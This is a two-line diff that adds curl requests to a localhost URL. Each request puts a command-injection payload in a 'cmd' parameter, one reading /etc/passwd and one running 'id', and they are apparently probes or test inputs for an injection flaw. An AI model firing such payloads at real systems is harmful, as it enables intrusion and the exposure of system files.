@@ -1,0 +1,2 @@
+curl -sk "https://localhost/?cmd=ls|cat%20/etc/passwd"
+curl -sk "https://localhost/?cmd=;id"
